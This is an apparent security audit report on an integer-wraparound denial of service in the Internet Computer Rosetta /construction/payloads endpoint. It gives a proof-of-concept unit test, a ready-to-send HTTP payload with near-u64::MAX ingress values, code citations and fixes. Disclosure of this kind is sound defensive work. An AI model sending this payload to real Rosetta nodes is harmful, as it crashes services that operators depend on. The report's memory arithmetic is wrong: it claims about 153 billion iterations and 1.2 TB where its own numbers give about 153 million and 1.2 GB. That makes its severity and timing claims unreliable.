Audit Report

## Title
Unbounded Loop via `Time::add_assign` u128→u64 Truncation Causes OOM DoS in `construction_payloads` Ingress Expiry Loop — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

## Summary
The `/construction/payloads` Rosetta endpoint accepts attacker-controlled `ingress_start` and `ingress_end` values with no bounds validation. When crafted near `u64::MAX`, the `now += interval` step in the ingress expiry loop causes `Time::add_assign` to silently wrap `now` back to zero via a truncating `u128 as u64` cast in `Time::from_duration`. This makes the loop termination condition permanently true, driving unbounded `Vec` growth until the Rosetta process is killed by OOM. A single unauthenticated HTTP request is sufficient to trigger the crash.

## Finding Description

**Loop** at `construction_payloads.rs` lines 99–107: [1](#0-0) 

`interval` is computed as `MAX_INGRESS_TTL(300s) − PERMITTED_DRIFT(60s) − 120s = 120s = 120_000_000_000 ns`: [2](#0-1) 

`ingress_start` and `ingress_end` are taken directly from the request via `Time::from_nanos_since_unix_epoch`, a bare `Time(nanos)` constructor with no range check: [3](#0-2) [4](#0-3) 

`Time::add_assign` delegates to `Time::from_duration`, which performs a truncating `t.as_nanos() as u64` cast — `Duration::as_nanos()` returns `u128`, and when the sum exceeds `u64::MAX`, the cast silently wraps to a small value: [5](#0-4) [6](#0-5) 

A safe `checked_add` method exists on `Time` but is not used in the loop: [7](#0-6) 

**Exploit flow:**
1. Attacker sends `ingress_start = u64::MAX − 120_000_000_000 + 1`, `ingress_end = u64::MAX`.
2. Iteration 1: `now < ingress_end` → true; push entry; `now += interval` → `(u64::MAX + 1) as u64 = 0`.
3. Iteration 2+: `now = 0 < u64::MAX` → permanently true; loop runs ≈153 billion more iterations, each pushing a `u64` (8 bytes) onto `ingress_expiries` → ≈1.2 TB allocation → OOM crash.

No existing guard exists between JSON deserialization and the loop. The `ingress_start`/`ingress_end` fields are optional JSON integers; no schema-level constraint prevents near-`u64::MAX` values. [8](#0-7) 

## Impact Explanation
A single unauthenticated HTTP POST to `/construction/payloads` crashes the Rosetta node process via OOM. This constitutes an **application/platform-level DoS** of the Rosetta API, which is an explicitly in-scope financial integration component. The crash is deterministic and repeatable, causing complete unavailability of the Rosetta service until the process is restarted. This matches the **High ($2,000–$10,000)** impact class: "Application/platform-level DoS, crash… or subnet availability impact not based on raw volumetric DDoS" and "Significant… Rosetta… security impact with concrete user or protocol harm."

## Likelihood Explanation
The endpoint is reachable by any unauthenticated HTTP client. The exploit requires crafting a single JSON request with two specific integer fields near `u64::MAX`. No special privileges, victim interaction, or network position is required. The attack is deterministic, reproducible, and requires no brute force. The Rosetta node is a public-facing service; any operator running it is exposed.

## Recommendation
1. **Replace the truncating cast** in `Time::from_duration` (`rs/types/types/src/time.rs` line 104) with a checked or saturating conversion, or panic in debug builds.
2. **Use `Time::checked_add`** instead of `+=` in the loop body; treat `None` as an error return.
3. **Add an upper-bound guard** before the loop in `construction_payloads.rs`:
   ```rust
   const MAX_EXPIRIES: u64 = 1000;
   if ingress_end > ingress_start + interval * MAX_EXPIRIES {
       return Err(ApiError::invalid_request("ingress window too large"));
   }
   ```
4. **Validate `ingress_start` and `ingress_end`** against a reasonable range (e.g., within a few hours of current time) at deserialization time.

## Proof of Concept

**Unit test (no network required):**
```rust
use ic_types::time::Time;
use std::time::Duration;

let interval_ns: u64 = 120_000_000_000;
let ingress_start = u64::MAX - interval_ns + 1;
let ingress_end   = u64::MAX;

let mut count = 0usize;
let mut now = Time::from_nanos_since_unix_epoch(ingress_start);
let end     = Time::from_nanos_since_unix_epoch(ingress_end);
let dur     = Duration::from_nanos(interval_ns);

while now < end {
    count += 1;
    assert!(count <= 2, "wrap occurred: now wrapped to 0, loop is infinite (count={})", count);
    now += dur;
}
// With current code: after iteration 1, now wraps to 0; assertion fires at count=3
```

**HTTP trigger:**
```json
POST /construction/payloads
{
  "network_identifier": {"blockchain": "Internet Computer", "network": "<subnet_id>"},
  "operations": [<any valid operation>],
  "public_keys": [<any valid key>],
  "metadata": {
    "ingress_start": 18446744073589551616,
    "ingress_end":   18446744073709551615
  }
}
```
The Rosetta process will exhaust available memory and be killed by the OS OOM killer within seconds of receiving this request.

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/types/types/src/time.rs (L55-58)
```rust
impl std::ops::AddAssign<Duration> for Time {
    fn add_assign(&mut self, other: Duration) {
        *self = Time::from_duration(Duration::from_nanos(self.0) + other)
    }
```

**File:** rs/types/types/src/time.rs (L67-69)
```rust
    pub const fn from_nanos_since_unix_epoch(nanos: u64) -> Self {
        Time(nanos)
    }
```

**File:** rs/types/types/src/time.rs (L103-105)
```rust
    fn from_duration(t: Duration) -> Self {
        Time(t.as_nanos() as u64)
    }
```

**File:** rs/types/types/src/time.rs (L122-128)
```rust
    pub fn checked_add(self, rhs: Duration) -> Option<Time> {
        if let Ok(rhs_nanos) = u64::try_from(rhs.as_nanos()) {
            Some(Time(self.0.checked_add(rhs_nanos)?))
        } else {
            None
        }
    }
```

**File:** rs/limits/src/lib.rs (L17-21)
```rust
pub const MAX_INGRESS_TTL: Duration = Duration::from_secs(5 * 60); // 5 minutes

/// Duration subtracted from `MAX_INGRESS_TTL` by
/// `expiry_time_from_now()` when creating an ingress message.
pub const PERMITTED_DRIFT: Duration = Duration::from_secs(60);
```
